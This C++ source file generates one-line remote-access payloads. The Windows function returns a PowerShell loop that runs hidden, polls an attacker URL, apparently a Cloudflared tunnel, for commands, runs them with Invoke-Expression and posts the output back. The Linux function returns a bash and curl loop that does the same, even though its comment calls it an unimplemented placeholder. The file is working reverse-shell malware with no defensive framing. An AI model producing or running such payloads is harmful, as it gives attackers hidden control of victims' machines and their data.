#include <iostream>
#include <string>
#include <algorithm>  
#include <random>     

using namespace std;

/**
 * @brief Generates a random alphanumeric string of specified length.
 * 
 * Uses C++11 random utilities to generate a secure random string composed
 * of uppercase, lowercase letters, and digits.
 * 
 * @param length Length of the random string to generate.
 * @return A random string of the given length.
 */
string generate_random_string(int length) {
    static const char charset[] =
        "abcdefghijklmnopqrstuvwxyz"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "0123456789";

    string result;

    // Initialize random number generator
    random_device rd;  
    mt19937 gen(rd()); 
    uniform_int_distribution<> dis(0, sizeof(charset) - 2); // -2 to exclude null terminator

    for (int i = 0; i < length; ++i) {
        result += charset[dis(gen)];
    }

    return result;
}

/**
 * @brief Generates a one-line PowerShell payload string for Windows targets.
 * 
 * This payload:
 * - Retrieves the current username from environment variables.
 * - Enters an infinite loop to poll the given URL endpoints for commands.
 * - Executes received commands and posts back the output or errors.
 * - Uses two unique endpoint strings to separate command fetch and result post.
 * 
 * @param url The base URL to communicate with (usually Cloudflared public URL).
 * @return A string containing the full PowerShell payload.
 */
string payload_generator_windows(const string& url) {
    // Clean URL by removing newlines and carriage returns
    string clean_url = url;
    clean_url.erase(remove(clean_url.begin(), clean_url.end(), '\n'), clean_url.end());
    clean_url.erase(remove(clean_url.begin(), clean_url.end(), '\r'), clean_url.end());

    // Generate unique endpoint names for command and result exchange
    string endpoint1 = generate_random_string(8);


    // Construct the PowerShell payload string
    string payload =
    "Start-Process $PSHOME\\powershell.exe -ArgumentList{$username=$env:USERNAME; while ($true) { try { "
    "$response = Invoke-WebRequest -Uri \"" + clean_url + "/" + endpoint1 + "?user=$username\" -WebSession $session -ErrorAction Stop; "
    "$command = $response.Content.Trim(); "
    "if ($command -and $command.ToLower() -ne 'exit') { try { "
    "$output = Invoke-Expression -Command $command 2>&1 | Out-String; "
    "$body = @{ Result = $output }; "
    "try { Invoke-WebRequest -Uri \"" + clean_url + "/" + endpoint1 + "?user=$username\" -WebSession $session -Method Post -Body $body "
    "-ContentType \"application/x-www-form-urlencoded\" -TimeoutSec 5 -ErrorAction Stop | Out-Null } "
    "catch [System.Net.WebException] { } catch { } } "
    "catch { $errorBody = @{ Result = 'ERROR: $_' }; "
    "Invoke-WebRequest -Uri \"" + clean_url + "/" + endpoint1 + "?user=$username\" -WebSession $session -Method Post -Body $errorBody "
    "-ContentType \"application/x-www-form-urlencoded\" | Out-Null } } "
    "} catch [System.Net.WebException] { Start-Sleep -Seconds 1; continue } catch { } Start-Sleep -Milliseconds 500 }} -WindowStyle Hidden";

    return payload;
}

/**
 * @brief Placeholder function to generate a Linux shell payload.
 * 
 * Currently unimplemented.
 * 
 * @param url The base URL for communication.
 * @return An empty string.
 */
string payload_generator_linux(const string& url) {
    // Clean URL by removing newlines and carriage returns
    string clean_url = url;
    clean_url.erase(remove(clean_url.begin(), clean_url.end(), '\n'), clean_url.end());
    clean_url.erase(remove(clean_url.begin(), clean_url.end(), '\r'), clean_url.end());

    // Generate unique endpoint names for command and result exchange
    string endpoint1 = generate_random_string(8);

    // Construct the PowerShell payload string
    string payload =
    "username=$USER; cookie=$(mktemp); cwd=$(pwd); "
    "while true; do "
    "cmd=$(curl -s --cookie \"$cookie\" --cookie-jar \"$cookie\" --fail \"" + clean_url + "/" + endpoint1 + "?user=$username\") || { sleep 1; continue; }; "
    "cmd=$(echo \"$cmd\" | tr -d '\\r'); "
    "[ -n \"$cmd\" ] && { "
    "if [[ \"$cmd\" =~ ^cd[[:space:]]*($|~|/|\\.\\.|[^;&|]*) ]]; then "
    "  dir=$(echo \"$cmd\" | cut -d' ' -f2-); "
    "  if [[ -z \"$dir\" ]]; then dir=\"$HOME\"; fi; "
    "  cd \"$cwd\" && cd \"$dir\" 2>/dev/null && cwd=$(pwd); "
    "  output=\"Changed directory to $cwd\"; "
    "else "
    "  output=$(cd \"$cwd\" && bash -c \"$cmd\" 2>&1); "
    "fi; "
    "curl -s --cookie \"$cookie\" --cookie-jar \"$cookie\" --fail -X POST "
    "-H \"Content-Type: application/x-www-form-urlencoded\" "
    "--data-urlencode \"Result=$output\" \"" + clean_url + "/" + endpoint1 + "?user=$username\" >/dev/null 2>&1 || true; }; "
    "sleep 0.5; "
    "done"
    "&";

    return payload;
}